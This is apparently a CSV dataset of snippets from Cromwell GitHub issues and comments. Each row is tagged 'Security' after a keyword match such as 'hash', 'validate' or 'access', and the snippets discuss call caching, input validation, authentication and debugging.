Security,"Call caching works sometimes for me but not all the time. I find it especially strange when working on a scatter job and some of the scatter jobs get a cache hit but others get a cache miss. . I have queried the METADATA_ENTRY table for the two workflows and all the call cache entries look identical. . Here is my process:. 1. I queried METADATA_ENTRY with this WHERE condition: `(WORKFLOW_EXECUTION_UUID ='29791b64-b47a-44ba-aff0-7ab48bc10677' or WORKFLOW_EXECUTION_UUID ='5de042e3-7a03-4c77-8972-f0e4cd010e4b') and CALL_FQN = 'sampleLevelWorkflow_WGS.align' and JOB_SCATTER_INDEX =0`; 2. I sort by METADATA_KEY; 3. Then I go down the list and compare the hashes for the two workflows for each METADATA_KEY. Here is a case where workflow 29791b64 is a restart of 5de042e3. (Workflow 5de042e3 is itself a restart but I don't think that is important here.) I have shown below all the records from METADATA_ENTRY that start with ""callCaching"" and they all look identical, yet it clearly says it is a ""Cache Miss"". **Is there anywhere I can see a log message stating exactly which hashes resulted in the cache miss?** I have tried to enable LOG_LEVEL=DEBUG but couldn't see it there. Thanks in advance for your help!. |WORKFLOW_EXECUTION_UUID|METADATA_KEY|METADATA_VALUE|; |-----------------------|------------|--------------|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:result|Cache Miss|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:result|Cache Miss|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCachin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:658,hash,hashes,658,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"Call input validation expects LHS of MemberAccess in the input mappings to be Calls, but now they can be scatter items too if the item is a pair.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2692:11,validat,validation,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2692,1,['validat'],['validation']
Security,Can we also have a test to exercise the multiple errors validations?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/562#issuecomment-197047812:56,validat,validations,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/562#issuecomment-197047812,1,['validat'],['validations']
Security,"Can you elaborate on why you want the functionality described? It is possible that call caching will help, but be aware that Cromwell will only read from the cache when absolutely everything matches - hashes of input files, WDL workflow, etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5300#issuecomment-561673981:201,hash,hashes,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5300#issuecomment-561673981,1,['hash'],['hashes']
Security,Can't reproduce on the prod FC hash. Reassigning back to you since I'm blocked at the moment.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4166#issuecomment-425192938:31,hash,hash,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4166#issuecomment-425192938,1,['hash'],['hash']
Security,Catch sub-workflow task input passing from inputs.json at validation time.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3640:58,validat,validation,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3640,1,['validat'],['validation']
Security,Centaur reference image test should validate symlinks [VS-796],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6996:36,validat,validate,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6996,1,['validat'],['validate']
Security,Centaur tests poorly assess the format of output files in the metadata. To avoid regressions it would be preferable to have better coverage of this.; The main issue comes from the fact that files path are dynamic and hard to validate with the static test definitions centaur has.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3160:225,validat,validate,225,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3160,1,['validat'],['validate']
Security,Centaur to assert output hashes,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4904:25,hash,hashes,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4904,1,['hash'],['hashes']
Security,"Certain error messages that Cromwell receives are longer than the default limit, which is a big pain when debugging. Going from 64 to 1024 characters (1kb) doesn't seem unreasonable and solves this issue. For context, the error message below is 364 characters. . [Relevant Akka Doc](https://doc.akka.io/docs/akka-http/10.0/configuration.html). . Before:; ```; 2024-04-12 14:58:18 cromwell-system-akka.actor.default-dispatcher-26 ERROR - Error in stage [akka.http.impl.engine.client.OutgoingConnectionBlueprint$PrepareResponse@71a2a20e]: Response reason phrase exceeds the configured limit of 64 characters; akka.http.scaladsl.model.IllegalResponseException: Response reason phrase exceeds the configured limit of 64 characters; 	at akka.http.impl.engine.client.OutgoingConnectionBlueprint$PrepareResponse$$anon$3.onPush(OutgoingConnectionBlueprint.scala:191); 	at akka.stream.impl.fusing.GraphInterpreter.processPush(GraphInterpreter.scala:523); 	at akka.stream.impl.fusing.GraphInterpreter.execute(GraphInterpreter.scala:409); 	at akka.stream.impl.fusing.GraphInterpreterShell.runBatch(ActorGraphInterpreter.scala:606); 	at akka.stream.impl.fusing.ActorGraphInterpreter$SimpleBoundaryEvent.execute(ActorGraphInterpreter.scala:47); 	at akka.stream.impl.fusing.ActorGraphInterpreter$SimpleBoundaryEvent.execute$(ActorGraphInterpreter.scala:43); 	at akka.stream.impl.fusing.ActorGraphInterpreter$BatchingActorInputBoundary$OnNext.execute(ActorGraphInterpreter.scala:85); 	at akka.stream.impl.fusing.GraphInterpreterShell.processEvent(ActorGraphInterpreter.scala:581); 	at ; ...; ```. After: ; ```; <!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN"">; <html><head>; <title>401 Unauthorized</title>; </head><body>; <h1>Unauthorized</h1>; <p>This server could not verify that you; are authorized to access the document; requested. Either you supplied the wrong; credentials (e.g., bad password), or your; browser doesn't understand how to supply; the credentials required.</p>; </body></html>; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7406:1779,authoriz,authorized,1779,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7406,3,"['access', 'authoriz', 'password']","['access', 'authorized', 'password']"
Security,"Certain heterogeneous maps validate in Womtool, fail in Cromwell",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4512:27,validat,validate,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4512,1,['validat'],['validate']
Security,"Changes are related only to the Shadow world. The expectations of this PR is to extend the current state of things in Workflow Execution (i.e currently we only run a single call workflow) to allow arbitrarily sized workflows (i.e. an N-call workflow). The intention is _not_ to support scatters in this PR, but allow it to be extensible for scatters (or Inception-esque nested scatters, which I hope to take up as my next ticket). ~~The original WA used Data Access and symbol store to pass around information between tasks. I am not quite sure how that would work with the shadow world, also considering we don't (yet) have engine functions at that level. So I have used a little different algorithm to orchestrate the calls in a workflow (preparing a small call graph and sorting that graph to obtain the logical ordering among tasks, and then orchestrate that via information in the FSM state data).~~. ~~I might wait for @Horneth for getting the engine functions in and have thoughts from you guys on plugging in outputs of a task to it's dependent task.~~. ~~I talked with Thibault about this and I honestly don't mind if this PR does't get merged at all if we see a problem with this, just need a fresh pair of eyes to look through it.~~. ~~Currently, I'm adding tests for all this new code.~~",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/743:459,Access,Access,459,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/743,1,['Access'],['Access']
Security,Changes to proxy compose settings to support LDAP Authorization.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/359:50,Authoriz,Authorization,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/359,1,['Authoriz'],['Authorization']
Security,Chaos monkey Cromwell. Put up a Firewall and deny access to Cromwell. Tear down. See what happened. Block ports. Tables. ; Putting up a block. . The real Chaos Monkey. Much hectic. Simian army. . Henry knows how to spin up a Cromwell test environment. Much magic.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2113:32,Firewall,Firewall,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2113,2,"['Firewall', 'access']","['Firewall', 'access']"
Security,"Check before this in the stdout, I ran into this and it was due to a docker image not accessible. Still haven't figured out that problem but hopefully it will point you in the right direction. See link: ; https://gatkforums.broadinstitute.org/wdl/discussion/13540/unable-to-do-docker-lookup#latest",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-434821551:86,access,accessible,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-434821551,1,['access'],['accessible']
Security,Check that Cromwell has proper access rights to read Carbonited metadata from Carboniter's GCS bucket [BA-6323],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5459:31,access,access,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5459,1,['access'],['access']
Security,Checksum S3 signed URL downloads during localization [BT-257],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6485:0,Checksum,Checksum,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6485,1,['Checksum'],['Checksum']
Security,Cleanup documentation. Remove references to lifesciences and update docker authentication.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7196:75,authenticat,authentication,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7196,1,['authenticat'],['authentication']
Security,Client no longer always tries to inject refresh token.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2516:33,inject,inject,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2516,1,['inject'],['inject']
Security,"Closes #3195 . - Mostly cut and paste from `MaterializeWorkflowDescriptorActor` to the two new language projects.; - `MaterializeWorkflowDescriptorActor` now gets its language support from one of the plugged in languages and `engine` is not allowed to access language classes directly (except that it still can via `databaseMigration` but pretend you don't know that); - Doesn't do anything to split WDL into two versions. That can come later...!; - If no version is specified, we just pick the first version from the list. I suspect we'll actually want some kind of a ""decider"" function based on the file contents but walking before running...",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3211:252,access,access,252,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3211,1,['access'],['access']
Security,"Closes #3297. If you unzip a zip file containing a directory, don't assume the user wants to reference things from within that directory. Especially don't ignore the fact that there might be *other* directories in the zip file as well, which now cannot be accessed at all",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3434:256,access,accessed,256,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3434,1,['access'],['accessed']
Security,"Closes #3811 . Use a hint to the resolver to ignore the local scope of a `WdlTaskCall` and start the member access search in the next higher scope. ---. Deleted earlier comment about allowing search only in earlier lines within the same scope because it wouldn't help with; ```; call y as shouldntBeProblematic {; input:; cram = ""asdf"",; slam = cram.scram; }; ```; which is equally as problematic as; ```; call y as shouldntBeProblematic {; input:; cram = cram.scram; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4095:108,access,access,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4095,1,['access'],['access']
Security,Closes #4433 . The changes to `MaterializeWorkflowDescriptorActor.scala` and `CromwellApiService.scala` are basically just refactoring out reusable code into a shared place. It is a known issue (#4119) that Womtool cannot validate CWL; this limitation applies to the endpoint as well.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4467:222,validat,validate,222,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4467,1,['validat'],['validate']
Security,"Command:; ```bash; $ java -jar jars/cromwell-34.jar run does-not-exist.wdl; ```; Output:; ```; [2018-08-30 17:36:02,67] [info] Running with database db.url = jdbc:hsqldb:mem:6713284f-67ff-4eb9-9fd6-3fde0a4cc0ce;shutdown=false;hsqldb.tx=mvcc; [2018-08-30 17:36:10,85] [info] Running migration RenameWorkflowOptionsInMetadata with a read batch size of 100000 and a write batch size of 100000; [2018-08-30 17:36:10,87] [info] [RenameWorkflowOptionsInMetadata] 100%; [2018-08-30 17:36:11,02] [info] Running with database db.url = jdbc:hsqldb:mem:5893545c-e081-4c3d-827d-000af3765fc4;shutdown=false;hsqldb.tx=mvcc; [2018-08-30 17:36:11,72] [info] Slf4jLogger started; Exception in thread ""main"" cromwell.CromwellEntryPoint$$anon$1: ERROR: Unable to submit workflow to Cromwell::; Workflow source does not exist: does-not-exist.wdl; 	at cromwell.CromwellEntryPoint$.$anonfun$validOrFailSubmission$1(CromwellEntryPoint.scala:219); 	at cats.data.Validated.valueOr(Validated.scala:48); 	at cromwell.CromwellEntryPoint$.validOrFailSubmission(CromwellEntryPoint.scala:219); 	at cromwell.CromwellEntryPoint$.validateRunArguments(CromwellEntryPoint.scala:215); 	at cromwell.CromwellEntryPoint$.runSingle(CromwellEntryPoint.scala:56); 	at cromwell.CromwellApp$.runCromwell(CromwellApp.scala:14); 	at cromwell.CromwellApp$.delayedEndpoint$cromwell$CromwellApp$1(CromwellApp.scala:25); 	at cromwell.CromwellApp$delayedInit$body.apply(CromwellApp.scala:3); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); 	at scala.App.main(App.scala:76); 	at scala.App.main$(App.scala:74); 	at cromwell.CromwellApp$.main(CromwellApp.scala:3); 	at cromwell.CromwellApp.main(CromwellApp.scala); ```; Command-line tools are subject to usability standards identical to those of our oth",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4060:938,Validat,Validated,938,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4060,2,['Validat'],['Validated']
Security,Configure looking up of docker hash,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/336:31,hash,hash,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/336,1,['hash'],['hash']
Security,"Configuring as you suggested (following the instructions on the provided URL) does not even start the process. Apart of some typos in the instructions (e.g., `MYPASSWORD` instead of `MYSQL_PASSWORD`), it looks that there is a conectivity problem with the docker container running mysql. Steps to reproduce:. ```bash; # start mysql-server container; docker run -p 3306:3306 --name cromwell_db -e MYSQL_ROOT_PASSWORD=`cat my_sql.root.pwd` -e MYSQL_DATABASE=cromwell -e MYSQL_USER=cromwell -e MYSQL_PASSWORD=cromwell -d mysql/mysql-server:5.7; ```. The docker server is working and I can access the database using `docker exec -it cromwell_db mysql -u cromwell -p`. Adding to my configuration file:. ```; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?useSSL=false""; user = ""cromwell""; password = ""cromwell""; connectionTimeout = 5000; }; }; ```. And running locally:. ```bash; JAVA_OPTS=""-Dconfig.file=local.conf"" cromwell run --inputs inputs.json --metadata-output metadata-output.json workflow.wdl; ```. Produces the following log, which is the same even increasing the timeout:. ```; [2018-03-12 11:25:38,45] [info] Running with database db.url = jdbc:mysql://localhost/cromwell?useSSL=false; Exception in thread ""main"" java.lang.ExceptionInInitializerError; 	at cromwell.server.CromwellSystem.$init$(CromwellSystem.scala:24); 	at cromwell.CromwellEntryPoint$$anon$2.<init>(CromwellEntryPoint.scala:63); 	at cromwell.CromwellEntryPoint$.$anonfun$buildCromwellSystem$1(CromwellEntryPoint.scala:63); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.CromwellEntryPoint$.buildCromwellSystem(CromwellEntryPoint.scala:63); 	at cromwell.CromwellEntryPoint$.runSingle(CromwellEntryPoint.scala:47); 	at cromwell.CommandLineParser$.runCromwell(CommandLineParser.scala:95); 	at cromwell.CommandLineParser$.delayedEndpoint$cromwell$CommandLineParser$1(CommandLineParser.scala:105); 	at cromwell.CommandLineParser$delayedInit$",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453:585,access,access,585,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3387#issuecomment-372264453,2,"['access', 'password']","['access', 'password']"
Security,"Consider the following WDL using the [if then else](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#if-then-else) construct:; ```; version 1.0. workflow main {; call main {; input:; x = 1; }; }. task main {; input {; Int x; }. command <<<; echo ~{if x == 1 then 1 else 0}; >>>; }; ```; when I parse it:; ```; $ java -jar womtool-52.jar validate main.wdl ; ERROR: Unexpected symbol (line 20, col 15) when parsing 'e'. Expected then, got """". echo ~{if x == 1 then 1 else 0}; ^. $e = :if $e :then $e :else $e -> TernaryIf( cond=$1, iftrue=$3, iffalse=$5 ); ```. The following equivalent WDL instead:; ```; version 1.0. workflow main {; call main {; input:; x = 1; }; }. task main {; input {; Int x; }. Int y	= if x == 1 then 1 else 0; command <<<; echo ~{y}; >>>; }; ```; when I parse it:; ```; $ java -jar womtool-52.jar validate main.wdl ; Success!; ```. Similarly this equivalent WDL:; ```; version 1.0. workflow main {; call main {; input:; x = 1; }; }. task main {; input {; Int x; }. command <<<; echo ~{if !(x != 1) then 1 else 0}; >>>; }; ```; when I parse it:; ```; $ java -jar womtool-52.jar validate main.wdl ; Success!; ```; It seems like the parser does not accept the `==` operator in the condition of the `TernaryIf` for some reasons, but only in the case it is included in a `command <<< >>>` section.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5602:350,validat,validate,350,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5602,3,['validat'],['validate']
Security,Consistently resolve Docker labels to hashes within a workflow,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2094:38,hash,hashes,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2094,1,['hash'],['hashes']
Security,"Copying chat log below:. ---. dshiga [4:46 PM]; hi @kshakir, we're seeing a lot of workflows that have been stuck in submitted status for the past ~45 minutes. is something wrong in caas?; for example this workflow is stuck: 8de76a93-6b66-4c29-a2fe-31e6cd1f969e. kshakir [4:48 PM]; ```; Workflow 8de76a93-6b66-4c29-a2fe-31e6cd1f969e in state Running and restarted = false cannot be started and should not have been fetched.; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:60); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:56); at cromwell.engine.workflow.workflowstore.SqlWorkflowStore.$anonfun$fetchStartableWorkflows$1(SqlWorkflowStore.scala:57); at scala.util.Success.$anonfun$map$1(Try.scala:251); at scala.util.Success.map(Try.scala:209); at scala.concurrent.Future.$anonfun$map$1(Future.scala:288); at scala.concurrent.impl.Promise.liftedTree1$1(Promise.scala:29); at scala.concurrent.impl.Promise.$anonfun$transform$1(Promise.scala:29); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; :hmmm:. chrisl [4:50 P",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3673:435,validat,validation,435,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3673,8,"['Validat', 'validat']","['Validation', 'ValidationTry', 'validation']"
Security,"Could you post the Cromwell configuration you're using ? Are the samples you're using relatively large?; I'm just wild guessing but one option would be that Cromwell is spending a lot of time trying to calculate md5 hashes for input files.; There's a configuration option to use file paths instead of file content to determine file equivalence for call caching purposes.; If you can make the assumptions that files are immutable and you don't go back and change their content manually this can be something to try.; To try that, you can update your Cromwell configuration: in the `backend.providers.SLURM.config` section (or whatever your backend is named instead of `SLURM`), and add this:; `filesystems.local.caching.hashing-strategy=""path""`; and this; `filesystems.local.caching.duplication-strategy=[""soft-link""]`. If possible I'd also recommend using a MySql DB instead of file based HSQL.; There are instructions here on how to do that in a few lines: http://cromwell.readthedocs.io/en/develop/tutorials/PersistentServer/#lets-get-started. Let me know if that makes any difference :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386406902:216,hash,hashes,216,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584#issuecomment-386406902,2,['hash'],"['hashes', 'hashing-strategy']"
Security,Crc32c validation for archive uploads [BW-626],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6303:7,validat,validation,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6303,1,['validat'],['validation']
Security,Create a github account with push access that can be used for the release,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2402:34,access,access,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2402,1,['access'],['access']
Security,"Create a web service in a similar vein to CromIAM which will act as a passthrough to an underlying Cromwell server. This server will expose the [TES](https://github.com/ga4gh/task-execution-schemas) API and interact with Cromwell presumably by creating a single task workflow out of the what was passed in. The ultimate goal of this project is not to have some whizbang standalone server but to use this as an opportunity to identify what the translation path from submitting and interacting with a single task via TES looks like in the Cromwell world, instead of diving in and grafting TES directly into Cromwell's front end. . DoD: A completed server (language, etc is dealer's choice) which we can use to guide another stage of development to directly support TES as part of Cromwell's front end API *or* a document detailing why this can't happen.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2202:133,expose,expose,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2202,1,['expose'],['expose']
Security,"Create an actor, for use by the EJHA, which can dive into the DB (#1224) and retrieve the list of all CCRIDs which match a given (HashKey, HashResult) combination.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1232:130,Hash,HashKey,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1232,2,['Hash'],"['HashKey', 'HashResult']"
Security,"Creates hashes for the following:; - command; - backend name; - output expression; - non-file inputs (as simpletons); - file input paths (according to config). Not included in this PR:; - backend specific hashes (runtime attributes, docker, file contents). Note that if you want anything to actually be written you'll want the following options (to avoid a hashing failure); - `lookup-docker-hash=false`; - `hash-docker-names=false`; - `hash-file-paths=true` -- actually you could leave this false but... then you'd always cache hit regardless of what files you're using!; - `hash-file-contents=false`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1290:8,hash,hashes,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1290,7,['hash'],"['hash', 'hash-docker-names', 'hash-file-contents', 'hash-file-paths', 'hashes', 'hashing']"
Security,Creating WorkflowDescriptor after validation in WorkflowManagerActor. Closes #544.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/582:34,validat,validation,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/582,1,['validat'],['validation']
Security,"Crom support went back to redteam; here is the content from the dsde-docs issue:. ----. There's documentation in the CHANGELOG but nothing in the README, though what's in the CHANGELOG might suffice for the README. I don't know any more than this anyway, @Horneth is the expert. 😛 . * Add support for Google Private IPs through `noAddress` runtime attribute. If set to true, the VM will NOT be provided with a public IP address.; *Important*: Your project must be whitelisted in ""Google Access for Private IPs Early Access Program"". If it's not whitelisted and you set this attribute to true, the task will hang.; Defaults to `false`.; e.g:; ```; task {; command {; echo ""I'm private !""; }. runtime {; docker: ""ubuntu:latest""; noAddress: true; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1922#issuecomment-375075999:487,Access,Access,487,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1922#issuecomment-375075999,2,['Access'],['Access']
Security,CromIAM check user authorization before forwarding request to Cromwell,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4348:19,authoriz,authorization,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4348,1,['authoriz'],['authorization']
Security,CromIAM will now allow access to the stats endpoint,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2137:23,access,access,23,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2137,1,['access'],['access']
Security,Cromwell 27 will be able to retrieve hashes for public images stored on quay.io,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2252#issuecomment-299852998:37,hash,hashes,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2252#issuecomment-299852998,1,['hash'],['hashes']
Security,"Cromwell appears to be spending a lot of time calculating MD5 hashes, even though the file strategy is path.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1597:62,hash,hashes,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1597,1,['hash'],['hashes']
Security,Cromwell can fallback to configured default runtime attributes. The current implementation leverages the fact that `WdlExpression` extends `WdlValue`. This is not true anymore with WomExpressions. Find a way to fix this preferably without having WomExpression extend WdlValue.; This breaks runtime attribute validation in the `BackendWorkflowInitializationActor` and default runtime attributes.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2606:308,validat,validation,308,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2606,1,['validat'],['validation']
Security,"Cromwell cannot handle any output that is struct base. I enclose a workflow where it is very clear to see that even though both latest development versions (as well as latest releases) of Cromwell and Womtool validated and executed the workflow for some strange reason at runtime Cromwell consider that it is a Map and not a struct and crashes in the very end of execution; ```; QuantifiedRun quantified_run = {""run"": srr, ""folder"": quant_folder, ""quant"": quant, ""lib"": quant_lib}; ```; ![screenshot_2019-02-15 screenshot](https://user-images.githubusercontent.com/842436/52889800-4dade280-318a-11e9-87b9-8b364e3408dd.png); [crashes_at_runtime.zip](https://github.com/broadinstitute/cromwell/files/2871310/crashes_at_runtime.zip)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4663:209,validat,validated,209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4663,1,['validat'],['validated']
Security,"Cromwell communicates with various gcloud endpoints. Instead of having N creds for N endpoints, sometimes Cromwell reuses creds for something else. For example: using the GCS creds for docker hash lookups [here](https://github.com/broadinstitute/cromwell/blob/78/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiBackendLifecycleActorFactory.scala#L70-L82). This PR adds an optional config for reference disk validation auth falling back to the `genomics` auth that was used previously. One can then use USA authentication for individual genomics calls and a separate system SA for verifying which of the reference disks are valid (at startup).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933:192,hash,hash,192,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6762#issuecomment-1127165933,3,"['authenticat', 'hash', 'validat']","['authentication', 'hash', 'validation']"
